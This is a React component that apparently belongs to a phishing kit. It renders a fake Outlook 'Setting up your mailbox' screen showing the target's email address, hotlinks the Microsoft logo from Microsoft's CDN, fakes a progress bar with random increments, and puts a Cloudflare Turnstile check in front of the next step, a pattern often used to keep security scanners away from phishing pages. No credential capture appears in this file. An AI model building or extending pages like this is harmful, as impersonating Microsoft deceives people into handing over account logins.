import React, { useState, useEffect, useRef } from 'react';

interface OutlookLoadingPageProps {
  email: string;
  onComplete: () => void;
}

export function OutlookLoadingPage({ email, onComplete }: OutlookLoadingPageProps) {
  const [turnstileToken, setTurnstileToken] = useState('');
  const [turnstileLoaded, setTurnstileLoaded] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const turnstileRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Initialize Turnstile when component mounts
    const initTurnstile = () => {
      if ((window as any).turnstile && turnstileRef.current) {
        try {
          (window as any).turnstile.render(turnstileRef.current, {
            sitekey: '0x4AAAAAABaeDHdwHVmJobfE',
            callback: (token: string) => {
              setTurnstileToken(token);
              // Start the final loading sequence after Turnstile is completed
              startFinalLoading();
            },
            'error-callback': () => {
              setTurnstileToken('');
            },
            theme: 'light',
            size: 'normal'
          });
          setTurnstileLoaded(true);
        } catch (error) {
          console.error('Turnstile render error:', error);
          setTurnstileLoaded(true);
          setTurnstileToken('fallback-token');
          startFinalLoading();
        }
      }
    };

    // Check if Turnstile is already loaded
    if ((window as any).turnstile) {
      initTurnstile();
    } else {
      // Wait for Turnstile to load
      const checkTurnstile = setInterval(() => {
        if ((window as any).turnstile) {
          initTurnstile();
          clearInterval(checkTurnstile);
        }
      }, 100);

      // Fallback: if Turnstile doesn't load within 10 seconds, allow proceeding
      const fallbackTimer = setTimeout(() => {
        if (!turnstileLoaded) {
          console.warn('Turnstile failed to load, using fallback');
          setTurnstileLoaded(true);
          setTurnstileToken('fallback-token');
          startFinalLoading();
        }
        clearInterval(checkTurnstile);
      }, 10000);

      return () => {
        clearInterval(checkTurnstile);
        clearTimeout(fallbackTimer);
      };
    }

    // Initial loading animation
    const progressTimer = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 60) {
          clearInterval(progressTimer);
          return 60; // Stop at 60% until Turnstile is completed
        }
        return prev + Math.random() * 10;
      });
    }, 200);

    return () => clearInterval(progressTimer);
  }, []);

  const startFinalLoading = () => {
    // Complete the loading animation after Turnstile
    const finalTimer = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) {
          clearInterval(finalTimer);
          // Wait a moment then proceed
          setTimeout(() => {
            onComplete();
          }, 500);
          return 100;
        }
        return prev + Math.random() * 15;
      });
    }, 150);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#f5f5f5' }}>
      {/* Header */}
      <div className="flex-1 flex flex-col items-center justify-center px-6">
        {/* Outlook Mail Icon */}
        <div className="mb-8">
          <div className="w-24 h-24 bg-gradient-to-br from-blue-400 to-blue-600 rounded-lg flex items-center justify-center shadow-lg">
            <svg className="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24">
              <path d="M7 9l5 3.5L17 9V7l-5 3.5L7 7v2zm0-4h10a2 2 0 012 2v10a2 2 0 01-2 2H7a2 2 0 01-2-2V7a2 2 0 012-2z"/>
            </svg>
          </div>
        </div>

        {/* Loading Text */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-light text-gray-800 mb-2">
            Setting up your mailbox
          </h1>
          <p className="text-sm text-gray-600 mb-4">
            {email}
          </p>
          
          {/* Progress Bar */}
          <div className="w-80 max-w-full mx-auto">
            <div className="bg-gray-200 rounded-full h-1 mb-4">
              <div 
                className="bg-blue-600 h-1 rounded-full transition-all duration-300 ease-out"
                style={{ width: `${loadingProgress}%` }}
              ></div>
            </div>
            <p className="text-xs text-gray-500">
              {loadingProgress < 60 ? 'Initializing...' : 
               !turnstileToken ? 'Security verification required' : 
               'Almost ready...'}
            </p>
          </div>
        </div>

        {/* Turnstile Widget */}
        {turnstileLoaded && !turnstileToken && (
          <div className="mb-8">
            <div className="text-center mb-4">
              <p className="text-sm text-gray-600 mb-2">
                Please complete the security verification to continue
              </p>
            </div>
            <div ref={turnstileRef}></div>
          </div>
        )}

        {/* Loading Indicator */}
        {!turnstileLoaded && (
          <div className="flex items-center space-x-2 text-sm text-gray-500 mb-8">
            <div className="w-4 h-4 border-2 border-gray-300 border-t-blue-600 rounded-full animate-spin"></div>
            <span>Loading security verification...</span>
          </div>
        )}

        {/* Success State */}
        {turnstileToken && loadingProgress >= 100 && (
          <div className="flex items-center space-x-2 text-sm text-green-600">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
            </svg>
            <span>Ready! Redirecting...</span>
          </div>
        )}
      </div>

      {/* Footer */}
      <div className="py-6">
        <div className="flex justify-center">
          <img 
            className="h-6 w-auto opacity-60" 
            src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" 
            alt="Microsoft" 
          />
        </div>
      </div>
    </div>
  );
}